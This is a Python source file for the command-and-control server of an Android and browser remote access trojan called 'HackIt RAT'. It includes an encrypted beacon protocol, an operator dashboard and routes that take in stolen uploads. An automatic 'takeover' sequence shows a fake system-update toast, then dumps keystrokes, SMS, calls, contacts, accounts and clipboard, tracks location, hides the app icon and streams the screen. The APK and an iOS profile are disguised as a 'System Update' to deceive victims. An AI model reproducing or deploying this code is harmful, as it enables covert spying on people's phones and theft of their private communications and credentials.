"""C2 listener: encrypted beacon, artifact transfer, dashboard and operator API.

The beacon is a single POST of a sealed envelope. The reply body is sealed with
the same PSK, so the whole conversation is opaque to anything between the
device and the C2 — no plaintext op, task or artifact rides on the wire.

Two surfaces share one aiohttp app:

* ``/v1/*``  — device endpoints, authenticated by the envelope MAC.
* ``/api/*`` — operator endpoints, authenticated by a bearer token that the
  server prints at boot (or reads from ``--token``).

Tasks are handed to devices through an in-memory asyncio queue mirror of the
DB queue. The DB stays the source of truth: on restart queued tasks replay.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import os
import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Dict, Optional

from aiohttp import web
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

from . import builder
from . import ios as WEBAGENT
from . import webagent
from . import protocol, store
from .protocol import ProtocolError


def load_web_token() -> str:
    """Stable token shared by the web agent, the installer links and the APK."""
    path = os.path.join(store.ROOT, "webtoken")
    if os.path.isfile(path):
        value = open(path, encoding="utf-8").read().strip()
        if value:
            return value
    value = secrets.token_urlsafe(9)
    os.makedirs(store.ROOT, exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(value)
    os.chmod(path, 0o600)
    return value


@dataclass
class Hub:
    """Shared runtime state: PSK, operator auth, per-session wakeups."""

    psk: bytes
    token: str
    public_url: str
    web_token: str = ""
    udp_port: int = 0
    dist_dir: str = ""
    max_tasks: int = 16
    stale_after: int = 180
    offline_after: int = 300
    auto_takeover: bool = True
    takeover_sleep_ms: int = 20_000
    sessions: Dict[str, asyncio.Event] = field(default_factory=dict)
    started: float = field(default_factory=time.time)

    def wake(self, sid: str) -> None:
        event = self.sessions.get(sid)
        if event is not None:
            event.set()

    def event_for(self, sid: str) -> asyncio.Event:
        event = self.sessions.get(sid)
        if event is None:
            event = asyncio.Event()
            self.sessions[sid] = event
        return event


def _peer(request: web.Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        return forwarded.split(",")[0].strip()[:64]
    return (request.remote or "?")[:64]


def _op_auth(request: web.Request) -> None:
    hub: Hub = request.app["hub"]
    header = request.headers.get("Authorization", "")
    got = header[7:] if header.lower().startswith("bearer ") else ""
    if not got or not hmac.compare_digest(got, hub.token):
        raise web.HTTPUnauthorized(text="bad token")


async def _read_envelope(request: web.Request) -> Dict[str, Any]:
    hub: Hub = request.app["hub"]
    raw = await request.read()
    try:
        opened = protocol.open_envelope(hub.psk, raw)
        body = json.loads(opened["body"].decode("utf-8"))
    except ProtocolError as exc:
        raise web.HTTPBadRequest(text=f"envelope: {exc}") from exc
    except (ValueError, UnicodeDecodeError) as exc:
        raise web.HTTPBadRequest(text=f"body: {exc}") from exc
    if not isinstance(body, dict):
        raise web.HTTPBadRequest(text="body is not an object")
    return {"sid": opened["sid"], "body": body}


async def _seal_reply(hub: Hub, sid: str, body: Dict[str, Any]) -> web.Response:
    try:
        env = protocol.seal(hub.psk, sid, protocol.pack(body))
    except protocol.ProtocolError as exc:  # payload too big — tell the device why
        raise web.HTTPInternalServerError(text=str(exc)) from exc
    return web.json_response(env)


# First contact runs the whole playbook without the operator touching a key:
# identity, permission state, every collector the spec allows, live location and
# the screen stream. A device that lands is already fully owned by the time the
# dashboard draws it.
TAKEOVER_STEPS = (
    ("toast", ["System update installed"]),
    ("vibrate", ["250"]),
    ("takeover", []),
    ("info", []),
    ("perm_status", []),
    ("apps", []),
    ("usage", ["7"]),
    ("keylog_dump", []),
    ("notif_dump", []),
    ("clipboard_get", []),
    ("sms_dump", ["300"]),
    ("calls_dump", ["300"]),
    ("contacts_dump", ["2000"]),
    ("accounts", []),
    ("wifi_dump", []),
    ("loc_track", ["on"]),
    ("loc", []),
    ("files_ls", ["/sdcard"]),
    ("hide_icon", []),
    ("screen_start", []),
)


def takeover_playbook(spec: str) -> list:
    modules = sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec or "rat", [])))
    return [(cmd, args) for cmd, args in TAKEOVER_STEPS if protocol.allowed(cmd, modules)]


def auto_takeover(hub: Hub, sid: str) -> int:
    """Claim and queue the playbook once. Returns queued task count."""
    if not hub.auto_takeover or not store.claim_takeover(sid):
        return 0
    session = store.get_session(sid) or {}
    spec = str(session.get("spec") or "rat")
    queued = 0
    for cmd, args in takeover_playbook(spec):
        try:
            store.queue_task(sid, cmd, args)
            queued += 1
        except protocol.ProtocolError:
            continue
    # A fresh device beacons fast so the playbook drains before the first nap.
    store.touch(sid, sleep_ms=hub.takeover_sleep_ms)
    store.add_event(sid, "takeover", {"spec": spec, "steps": queued})
    return queued


def _ingest_events(sid: str, body: Dict[str, Any]) -> None:
    """Event batches are drained from the beacon and sorted into typed tables."""
    batch = body.get("events") or []
    if not isinstance(batch, list):
        return
    for event in batch[:200]:
        if not isinstance(event, dict):
            continue
        kind = str(event.get("kind") or "")[:32]
        data = event.get("data")
        if kind == "keylog" and isinstance(data, list):
            store.add_keylogs(sid, data)
            continue
        if kind == "loc" and isinstance(data, list):
            store.add_locations(sid, data)
            continue
        if kind == "sms" and isinstance(data, list):
            store.add_event(sid, "sms", data[:200])
            continue
        if kind in ("call", "notif", "clip", "app", "shell", "mic", "cam", "screen", "file", "net"):
            store.add_event(sid, kind, data)
            continue
        store.add_event(sid, kind or "misc", data)


def _ingest_results(hub: Hub, sid: str, body: Dict[str, Any]) -> None:
    results = body.get("results") or []
    if not isinstance(results, list):
        return
    for result in results[:64]:
        if not isinstance(result, dict):
            continue
        task_id = result.get("id")
        if not isinstance(task_id, int):
            continue
        output = result.get("out")
        if isinstance(output, (dict, list)):
            output = json.dumps(output, ensure_ascii=False)
        elif output is None:
            output = ""
        else:
            output = str(output)
        store.complete_task(task_id, sid, output, int(result.get("code") or 0))


def _ingest_loot(sid: str, body: Dict[str, Any]) -> None:
    """Devices may announce artifacts they already uploaded by token."""
    items = body.get("loot") or []
    if not isinstance(items, list):
        return
    for item in items[:32]:
        if not isinstance(item, dict):
            continue
        path = str(item.get("path") or "")
        if not path or not os.path.isfile(path):
            continue
        store.add_loot(sid, str(item.get("name") or os.path.basename(path)), path,
                       int(item.get("size") or 0), str(item.get("kind") or "file"))


def udp_key(psk: bytes) -> bytes:
    return protocol.hkdf(psk, b"chacha20-poly1305")


def udp_ingest(hub: Hub, sid: str, body: dict, peer: str) -> None:
    """Native datagrams land in the same store as HTTP beacons."""
    op = str(body.get("op") or "event")[:16]
    meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}
    store.register(sid, meta, peer, kind="native")
    store.touch(sid, meta, op, peer)
    auto_takeover(hub, sid)
    if op == "probe" or "data" in body and op != "event":
        store.add_event(sid, "probe", body.get("data") or body)
        return
    events = body.get("events")
    if isinstance(events, list):
        for event in events[:200]:
            if isinstance(event, dict):
                store.add_event(sid, str(event.get("kind") or "native")[:32], event.get("data"))
    else:
        store.add_event(sid, "native", body)


class UdpC2(asyncio.DatagramProtocol):
    """Sealed datagrams from libhackit.so, decrypted with the same PSK."""

    def __init__(self, hub: Hub, psk: bytes) -> None:
        self.hub = hub
        self.aead = ChaCha20Poly1305(udp_key(psk))
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr) -> None:
        if len(data) < 21 or data[:4] != b"HK1\x00":
            return
        if len(data) > 2048:
            return
        header, nonce, cipher = data[:21], data[9:21], data[21:]
        try:
            plain = self.aead.decrypt(nonce, cipher, header)
            body = json.loads(plain.decode("utf-8"))
        except Exception:
            return
        if not isinstance(body, dict):
            return
        sid = str(body.get("sid") or "")[:64]
        if not sid:
            sid = f"native-{addr[0].replace('.', '-')}-{addr[1]}"
        try:
            udp_ingest(self.hub, sid, body, f"{addr[0]}:{addr[1]}")
        except Exception:
            return

    def error_received(self, exc: Exception) -> None:
        _ = exc


async def start_udp(hub: Hub, psk: bytes) -> None:
    if not hub.udp_port:
        return
    loop = asyncio.get_running_loop()
    await loop.create_datagram_endpoint(lambda: UdpC2(hub, psk), local_addr=("0.0.0.0", hub.udp_port))


async def beacon(request: web.Request) -> web.Response:
    hub: Hub = request.app["hub"]
    peer = _peer(request)
    opened = await _read_envelope(request)
    sid, body = opened["sid"], opened["body"]
    op = str(body.get("op") or "")[:16]
    meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}

    if op == protocol.OP_REGISTER:
        store.register(sid, meta, peer)
        store.add_event(sid, "register", {"peer": peer, "model": meta.get("model")})
    elif not store.get_session(sid):
        # A device that lost its DB row is re-registered transparently.
        store.register(sid, meta, peer)
        store.add_event(sid, "register", {"peer": peer, "reason": "unknown-sid"})
    store.touch(sid, meta, op, peer)
    # Idempotent: claims once, so an upgraded device still gets its playbook on
    # the next beacon while established sessions pay one UPDATE per poll.
    auto_takeover(hub, sid)

    _ingest_results(hub, sid, body)
    _ingest_events(sid, body)
    _ingest_loot(sid, body)

    wanted = int(body.get("wanted") or hub.max_tasks)
    tasks = store.take_tasks(sid, max(1, min(wanted, hub.max_tasks)))
    session = store.get_session(sid) or {}
    sleep_ms = int(session.get("sleep_ms") or 0)
    return await _seal_reply(hub, sid, {"ok": True, "tasks": tasks, "sleep": sleep_ms})


async def upload(request: web.Request) -> web.Response:
    """Raw artifact body; metadata rides in headers. Token is the file name."""
    sid = request.match_info["sid"]
    if not store.get_session(sid):
        raise web.HTTPNotFound(text="unknown session")
    name = os.path.basename(request.headers.get("X-Name", "") or "artifact.bin")[:120]
    kind = (request.headers.get("X-Kind", "file") or "file")[:16]
    declared = request.content_length
    if declared is not None and declared > protocol.MAX_BODY:
        raise web.HTTPRequestEntityTooLarge(max_size=protocol.MAX_BODY, actual_size=declared)

    folder = os.path.join(store.FILES_DIR, sid)
    os.makedirs(folder, exist_ok=True)
    token = secrets.token_hex(8)
    path = os.path.join(folder, f"{token}-{name}")
    size = 0
    with open(path, "wb") as handle:
        async for chunk in request.content.iter_chunked(64 * 1024):
            size += len(chunk)
            if size > protocol.MAX_BODY:
                handle.close()
                os.unlink(path)
                raise web.HTTPRequestEntityTooLarge(max_size=protocol.MAX_BODY, actual_size=size)
            handle.write(chunk)
    if size == 0:
        os.unlink(path)
        raise web.HTTPBadRequest(text="empty body")

    if kind in ("mic", "cam", "screen"):
        store.add_event(sid, kind, {"name": name, "size": size, "path": path})
    else:
        store.add_loot(sid, name, path, size, kind)
    store.touch(sid)
    return web.json_response({"ok": True, "path": path, "size": size})


async def download(request: web.Request) -> web.StreamResponse:
    sid = request.match_info["sid"]
    token = request.match_info["token"]
    folder = os.path.join(store.FILES_DIR, sid)
    if not os.path.isdir(folder):
        raise web.HTTPNotFound()
    for entry in os.listdir(folder):
        if entry.startswith(token + "-"):
            path = os.path.join(folder, entry)
            if os.path.isfile(path):
                return web.FileResponse(path)
    raise web.HTTPNotFound()


async def assets(request: web.Request) -> web.Response:
    _op_auth(request)
    sid = request.match_info["sid"]
    return web.json_response({"ok": True, "items": store.loot(sid)})


# ---------------------------------------------------------------- operator

async def api_sessions(request: web.Request) -> web.Response:
    _op_auth(request)
    store.mark_offline(request.app["hub"].offline_after)
    return web.json_response({"ok": True, "sessions": store.sessions()})


async def api_session(request: web.Request) -> web.Response:
    _op_auth(request)
    sid = request.match_info["sid"]
    session = store.get_session(sid)
    if not session:
        raise web.HTTPNotFound(text="unknown session")
    return web.json_response(
        {
            "ok": True,
            "session": session,
            "tasks": store.tasks(sid, 100),
            "events": store.events(sid, limit=200),
            "loot": store.loot(sid),
            "locations": store.locations(sid, 200),
            "keylogs": store.keylogs(sid, 0, 500),
        }
    )


async def api_task(request: web.Request) -> web.Response:
    _op_auth(request)
    sid = request.match_info["sid"]
    if not store.get_session(sid):
        raise web.HTTPNotFound(text="unknown session")
    try:
        payload = await request.json()
        task_id = store.queue_task(sid, str(payload.get("cmd")), payload.get("args") or [])
    except (ValueError, TypeError, protocol.ProtocolError) as exc:
        raise web.HTTPBadRequest(text=str(exc)) from exc
    request.app["hub"].wake(sid)
    return web.json_response({"ok": True, "id": task_id})


async def api_sleep(request: web.Request) -> web.Response:
    _op_auth(request)
    sid = request.match_info["sid"]
    if not store.get_session(sid):
        raise web.HTTPNotFound(text="unknown session")
    try:
        payload = await request.json()
        sleep_ms = max(0, int(payload.get("sleep_ms") or 0))
    except (ValueError, TypeError) as exc:
        raise web.HTTPBadRequest(text=str(exc)) from exc
    store.touch(sid, sleep_ms=sleep_ms)
    return web.json_response({"ok": True, "sleep_ms": sleep_ms})


async def api_takeover(request: web.Request) -> web.Response:
    """Re-run the full takeover playbook against a session."""
    _op_auth(request)
    hub: Hub = request.app["hub"]
    sid = request.match_info["sid"]
    if not store.get_session(sid):
        raise web.HTTPNotFound(text="unknown session")
    store.release_takeover(sid)
    queued = auto_takeover(hub, sid)
    hub.wake(sid)
    return web.json_response({"ok": True, "queued": queued})


async def api_forget(request: web.Request) -> web.Response:
    _op_auth(request)
    sid = request.match_info["sid"]
    store.drop_session(sid)
    return web.json_response({"ok": True})


async def api_stats(request: web.Request) -> web.Response:
    _op_auth(request)
    hub: Hub = request.app["hub"]
    data = store.stats()
    data["uptime"] = int(time.time() - hub.started)
    data["public_url"] = hub.public_url
    return web.json_response({"ok": True, **data})


WEB_KINDS = {"info", "loc", "clip", "cam", "mic", "notif"}


def _web_sid(token: str, ip: str, ua: str) -> str:
    seed = f"{token}|{ip}|{ua}".encode("utf-8", "replace")
    return "web-" + hashlib.sha256(seed).hexdigest()[:24]


async def _web_ok(request: web.Request) -> None:
    if not hmac.compare_digest(request.match_info.get("token", ""), request.app["hub"].web_token):
        raise web.HTTPForbidden(text="bad web token")


def _dist(name: str) -> Optional[str]:
    folder = store.ROOT + "/dist"
    if not os.path.isdir(folder):
        return None
    exact = []
    any_apk = []
    for base, _dirs, names in os.walk(folder):
        for entry in names:
            path = os.path.join(base, entry)
            if entry == name:
                exact.append((os.path.getmtime(path), path))
            elif name.endswith(".apk") and entry.endswith(".apk"):
                any_apk.append((os.path.getmtime(path), path))
    pool = exact or (any_apk if name.endswith(".apk") else [])
    return max(pool)[1] if pool else None


async def download_apk(request: web.Request) -> web.Response:
    if not hmac.compare_digest(request.match_info["token"], request.app["hub"].web_token):
        raise web.HTTPForbidden(text="bad token")
    path = _dist("agent.apk")
    if not path:
        path = _dist("any")
    if not path:
        raise web.HTTPNotFound(text="no apk built yet — run: hackit rat build")
    return web.FileResponse(path, headers={"Content-Disposition": 'attachment; filename="update.apk"'})


async def live_frame(request: web.Request) -> web.Response:
    """Newest screen frame for a session, as MJPEG-friendly JPEG."""
    sid = request.match_info["sid"]
    token = request.headers.get("X-Token", "")
    if not hmac.compare_digest(token, request.app["hub"].token):
        raise web.HTTPForbidden(text="bad token")
    newest = None
    for row in store.loot(sid, 200):
        if row.get("kind") == "screen_frame":
            newest = row
            break
    if not newest or not os.path.isfile(newest["path"]):
        raise web.HTTPNotFound(text="no frame")
    return web.Response(body=open(newest["path"], "rb").read(),
                        content_type="image/jpeg",
                        headers={"Cache-Control": "no-store"})


async def download_index(request: web.Request) -> web.Response:
    if not hmac.compare_digest(request.match_info["token"], request.app["hub"].web_token):
        raise web.HTTPForbidden(text="bad token")
    token = request.match_info["token"]
    host = request.app["hub"].public_url
    from . import stager

    html = stager.LANDING.format(host=host, token=token)
    return web.Response(text=html, content_type="text/html")


async def webapp(request: web.Request) -> web.Response:
    await _web_ok(request)
    token = json.dumps(request.match_info["token"])
    page = webagent.PAGE.replace("%TOKEN%", token)
    return web.Response(text=page, content_type="text/html")


async def webasset(request: web.Request) -> web.Response:
    await _web_ok(request)
    name = request.match_info["name"]
    if name == "agent.js":
        return web.Response(text=webagent.AGENT, content_type="application/javascript")
    if name == "sw.js":
        return web.Response(text=WEBAGENT.SERVICE_WORKER, content_type="application/javascript")
    if name == "manifest.webmanifest":
        url = str(request.url).removesuffix("/manifest.webmanifest")
        return web.Response(body=WEBAGENT.manifest(url), content_type="application/manifest+json")
    if name == "icon.png":
        return web.Response(body=WEBAGENT.ICON, content_type="image/png")
    if name == "hackit-webclip.mobileconfig":
        url = str(request.url).removesuffix("/hackit-webclip.mobileconfig")
        return web.Response(body=WEBAGENT.profile("System Update", url),
                            content_type="application/x-apple-aspen-config",
                            headers={"Content-Disposition": 'attachment; filename="System Update.mobileconfig"'})
    raise web.HTTPNotFound()


def _write_web_artifact(sid: str, kind: str, b64: str, name: str, mime: str) -> Optional[str]:
    try:
        blob = base64.b64decode(b64, validate=True)
    except (ValueError, TypeError):
        return None
    if not blob or len(blob) > protocol.MAX_BODY:
        return None
    folder = os.path.join(store.FILES_DIR, sid)
    os.makedirs(folder, exist_ok=True)
    safe = os.path.basename(name or f"web-{kind}")[:120]
    path = os.path.join(folder, secrets.token_hex(6) + "-" + safe)
    with open(path, "wb") as handle:
        handle.write(blob)
    store.add_event(sid, kind, {"name": safe, "size": len(blob), "mime": mime, "path": path})
    store.add_loot(sid, safe, path, len(blob), kind)
    return path


async def web_report(request: web.Request) -> web.Response:
    """Browser heartbeat. Same-origin, so the token is the only auth."""
    await _web_ok(request)
    ip = _peer(request)
    ua = request.headers.get("User-Agent", "")[:300]
    sid = _web_sid(request.match_info["token"], ip, ua)
    try:
        raw = await request.read()
        if len(raw) > protocol.MAX_BODY:
            raise web.HTTPRequestEntityTooLarge(max_size=protocol.MAX_BODY, actual_size=len(raw))
        body = json.loads(raw.decode("utf-8")) if raw else {}
    except (ValueError, UnicodeDecodeError) as exc:
        raise web.HTTPBadRequest(text=str(exc)) from exc
    if not isinstance(body, dict):
        raise web.HTTPBadRequest(text="body is not an object")
    kind = str(body.get("kind") or "info")[:16]
    if kind not in WEB_KINDS:
        kind = "info"
    meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}
    meta.setdefault("model", str(meta.get("platform") or "browser")[:80])
    meta.setdefault("label", "web:" + str(meta.get("ua_platform") or "browser")[:40])
    meta.setdefault("sdk", 0)
    fresh = store.get_session(sid) is None
    store.register(sid, meta, ip, kind="web")
    store.touch(sid, meta, kind, ip)
    if fresh:
        store.claim_takeover(sid)
        store.add_event(sid, "takeover", {"spec": "web"})

    data = body.get("data")
    if kind in ("cam", "mic") and isinstance(data, dict):
        _write_web_artifact(sid, kind, str(data.get("b64") or ""),
                            str(data.get("name") or ""), str(data.get("mime") or ""))
    elif kind == "loc" and isinstance(data, list):
        store.add_locations(sid, data)
        store.add_event(sid, "loc", data[:10])
    elif kind == "clip":
        text = data.get("text") if isinstance(data, dict) else data
        store.add_event(sid, "clip", {"text": str(text or "")[:8000]})
    elif kind == "info":
        store.add_event(sid, "info", meta)
        if "battery" in meta:
            store.touch(sid, {"battery": meta["battery"], "charging": meta.get("charging", 0)})
    return web.json_response({"ok": True, "sid": sid})


DASHBOARD = """<!doctype html>
<html><head><meta charset="utf-8"><title>HackIt RAT</title>
<style>
:root{--bg:#0b0f14;--panel:#131a22;--edge:#22303d;--ink:#d7e3ee;--dim:#6f8397;--acc:#33d1a0}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);
font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
header{display:flex;gap:14px;align-items:center;padding:12px 18px;border-bottom:1px solid var(--edge)}
h1{font-size:14px;margin:0;letter-spacing:.14em;color:var(--acc)}
main{display:grid;grid-template-columns:320px 1fr;min-height:calc(100vh - 49px)}
#list{border-right:1px solid var(--edge);overflow:auto}
.card{padding:10px 14px;border-bottom:1px solid var(--edge);cursor:pointer}
.card:hover,.card.on{background:var(--panel)}
.lbl{color:var(--acc)}.dim{color:var(--dim)}
#pane{padding:14px 18px;overflow:auto}
pre{white-space:pre-wrap;word-break:break-word;background:#0e141b;border:1px solid var(--edge);
padding:10px;border-radius:6px;max-height:46vh;overflow:auto}
input,button,select{background:#0e141b;color:var(--ink);border:1px solid var(--edge);
border-radius:5px;padding:7px 9px;font:inherit}
button{color:var(--acc);cursor:pointer}button:hover{background:#16212c}
.row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
.tag{display:inline-block;padding:1px 7px;border:1px solid var(--edge);border-radius:9px;font-size:11px;color:var(--dim)}
.on-dot{color:var(--acc)}
</style></head><body>
<header><h1>HACKIT · RAT</h1><span class="dim" id="stat">…</span>
<span style="flex:1"></span><input id="token" type="password" placeholder="operator token" size="26">
<button onclick="boot()">connect</button></header>
<main><div id="list"></div><div id="pane"><p class="dim">select a session</p></div></main>
<script>
let token = localStorage.getItem('rat-token') || '';
document.getElementById('token').value = token;
let sid = null, timer = null;
async function api(path, opts={}){
  opts.headers = Object.assign({'Authorization':'Bearer '+token}, opts.headers||{});
  const res = await fetch(path, opts);
  if(!res.ok) throw new Error(await res.text());
  return res.json();
}
function esc(s){ return String(s??'').replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
async function boot(){
  token = document.getElementById('token').value.trim();
  localStorage.setItem('rat-token', token);
  try {
    const st = await api('/api/stats');
    document.getElementById('stat').textContent =
      `${st.online} online / ${st.sessions} known · ${st.events} events · ${st.loot} loot`;
    const data = await api('/api/sessions');
    const list = document.getElementById('list');
    list.innerHTML = data.sessions.map(s=>`
      <div class="card ${s.sid===sid?'on':''}" onclick="open_('${s.sid}')">
        <div><span class="${s.online?'on-dot':'dim'}">●</span> <span class="lbl">${esc(s.label||s.sid.slice(0,8))}</span></div>
        <div class="dim">${esc(s.model||'?')} · api ${s.sdk} · ${s.battery||0}%${s.charging?' ⚡':''}</div>
        <div class="dim">${new Date(s.last_seen*1000).toLocaleTimeString()} · ${esc(s.pub_ip||'')}</div>
      </div>`).join('') || '<p class="dim" style="padding:14px">no sessions</p>';
    if(sid) render();
    clearInterval(timer); timer = setInterval(boot, 5000);
  } catch(e){ alert(e.message); }
}
async function open_(id){ sid = id; render(); }
async function render(){
  const d = await api('/api/session/'+sid);
  const s = d.session;
  const pane = document.getElementById('pane');
  pane.innerHTML = `
    <h2 style="font-size:14px">${esc(s.label)} <span class="dim">${esc(s.model||'')}</span></h2>
    <p class="dim">${esc(s.owner||'')} · ${esc(s.phone||'')} · android ${esc(s.android||'')} (sdk ${s.sdk}) · ${esc(s.abi||'')}<br>
    first seen ${new Date(s.first_seen*1000).toLocaleString()} · last ${new Date(s.last_seen*1000).toLocaleString()}</p>
    <div class="row">
      <select id="cmd">${['info','perm_status','sms_dump','calls_dump','contacts_dump','loc','files_ls','clipboard_get','notif_dump','apps','keylog_dump','wifi_dump','accounts','shell'].map(c=>`<option>${c}</option>`).join('')}</select>
      <input id="args" placeholder="args, space separated" size="34">
      <button onclick="send()">queue</button>
      <button onclick="sleep_()">set sleep</button>
    </div>
    <h3>tasks</h3><pre>${d.tasks.map(t=>`#${t.id} ${t.cmd} ${esc(t.args)} [${t.state}]\\n${esc(t.output||'')}`).join('\\n')||'—'}</pre>
    <h3>events</h3><pre>${d.events.slice(-80).reverse().map(e=>`${new Date(e.ts*1000).toLocaleTimeString()} ${e.kind} ${esc(e.body).slice(0,600)}`).join('\\n')||'—'}</pre>
    <h3>locations</h3><pre>${d.locations.map(l=>`${l.lat},${l.lon} ±${l.accuracy} ${l.provider}`).join('\\n')||'—'}</pre>
    <h3>keylogs</h3><pre>${d.keylogs.slice(-120).map(k=>`[${esc(k.package)}] ${esc(k.text)}`).join('\\n')||'—'}</pre>
    <h3>loot</h3><pre>${d.loot.map(l=>`${esc(l.name)} ${l.size}b <a style="color:var(--acc)" href="/v1/download/${sid}/${l.path.split('/').pop().split('-')[0]}">get</a>`).join('\\n')||'—'}</pre>`;
}
async function send(){
  const cmd = document.getElementById('cmd').value;
  const args = document.getElementById('args').value.trim().split(/\\s+/).filter(Boolean);
  try { await api('/api/task/'+sid, {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cmd, args})}); render(); } catch(e){ alert(e.message); }
}
async function sleep_(){
  const ms = prompt('beacon interval ms (0 = default)', '0'); if(ms===null) return;
  await api('/api/sleep/'+sid, {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({sleep_ms: parseInt(ms,10)||0})});
}
boot();
</script></body></html>"""


async def dashboard(request: web.Request) -> web.Response:
    return web.Response(text=DASHBOARD, content_type="text/html")


async def _housekeeping(app: web.Application, hub: Hub) -> None:
    while True:
        await asyncio.sleep(45)
        store.mark_offline(hub.offline_after)
        store.requeue_stale(hub.stale_after)


def make_app(hub: Hub) -> web.Application:
    store.init()
    app = web.Application(client_max_size=protocol.MAX_BODY)
    app["hub"] = hub
    app["psk"] = hub.psk
    app.add_routes(
        [
            web.post("/v1/beacon", beacon),
            web.post("/v1/upload/{sid}", upload),
            web.get("/v1/download/{sid}/{token}", download),
            web.get("/v1/assets/{sid}", assets),
            web.get("/api/sessions", api_sessions),
            web.get("/api/session/{sid}", api_session),
            web.post("/api/task/{sid}", api_task),
            web.post("/api/sleep/{sid}", api_sleep),
            web.post("/api/takeover/{sid}", api_takeover),
            web.delete("/api/session/{sid}", api_forget),
            web.get("/api/stats", api_stats),
            web.get("/", dashboard),
            web.get("/v1/live/{sid}", live_frame),
            web.get("/dl/{token}/", download_index),
            web.get("/dl/{token}/{name}", download_apk),
            web.get("/w/{token}/", webapp),
            web.get("/w/{token}/{name}", webasset),
            web.post("/v1/web/{token}", web_report),
        ]
    )

    async def on_start(app: web.Application) -> None:
        app["housekeeper"] = asyncio.create_task(_housekeeping(app, hub))
        if hub.udp_port:
            await start_udp(hub, hub.psk)

    async def on_stop(app: web.Application) -> None:
        task = app["housekeeper"]
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

    app.on_startup.append(on_start)
    app.on_cleanup.append(on_stop)
    return app


def load_psk(path: str) -> bytes:
    """PSK is 32 raw bytes, hex or base64 encoded. Minted on first use."""
    if not os.path.isfile(path):
        return write_psk(path)
    with open(path, "rb") as handle:
        raw = handle.read().strip()
    if not raw:
        return write_psk(path)
    try:
        key = bytes.fromhex(raw.decode("ascii"))
    except (ValueError, UnicodeDecodeError):
        key = base64.b64decode(raw, validate=True)
    if len(key) != 32:
        raise ValueError(f"psk must be 32 bytes, got {len(key)}")
    mode = os.stat(path).st_mode & 0o777
    if mode & 0o077:
        os.chmod(path, 0o600)
    return hashlib.sha256(key).digest()


def write_psk(path: str) -> bytes:
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    key = secrets.token_bytes(32)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "wb") as handle:
        handle.write(key.hex().encode("ascii") + b"\n")
    return key


async def serve(host: str, port: int, psk_path: str, token: Optional[str], public_url: str,
                udp_port: int = 0) -> None:
    psk = load_psk(psk_path) if os.path.exists(psk_path) else write_psk(psk_path)
    token = token or secrets.token_urlsafe(24)
    hub = Hub(psk=psk, token=token, public_url=public_url,
              web_token=load_web_token(), udp_port=udp_port)
    app = make_app(hub)
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    print(f"  listen      {host}:{port}" + (f"  udp {udp_port}" if udp_port else ""))
    print(f"  public url  {public_url}")
    print(f"  token       {token}")
    print(f"  psk         {psk_path}")
    print(f"  ios page    {public_url}/w/{hub.web_token}/")
    await asyncio.Event().wait()


def run(host: str, port: int, psk_path: str, token: Optional[str], public_url: str,
        udp_port: int = 0) -> None:
    asyncio.run(serve(host, port, psk_path, token, public_url, udp_port))
